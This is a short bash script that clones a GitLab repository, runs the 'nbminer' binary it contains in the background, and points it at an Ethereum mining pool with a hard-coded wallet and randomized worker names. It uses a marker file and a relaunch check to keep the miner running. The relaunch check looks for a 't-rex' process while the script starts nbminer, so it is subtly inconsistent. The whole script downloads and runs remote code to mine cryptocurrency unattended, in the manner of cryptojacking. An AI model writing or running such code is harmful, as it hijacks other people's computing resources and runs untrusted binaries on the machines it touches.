#!/bin/bash
woker=$(date +'%d_%m_%H_%M_%S')
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/B8648rns22.txt" ]; then
	echo "Start setup..."
	echo "B8648rns22" > B8648rns22.txt
	git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
	./nbminer -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo SINTER-WILL-$(shuf -i 1-99999 -n 1)) --mt 5 --ts 5 --tl 200
 &
else
	if pgrep t-rex >/dev/null 2>&1
	then
		echo "RUNNING"
	else
		git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
	./nbminer -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x3da2c7743970908cac0e6b606f064330aea8b03f.$(echo SINTER-WILL-$(shuf -i 1-99999 -n 1)) --mt 5 --ts 5 --tl 200
 &
	fi
fi
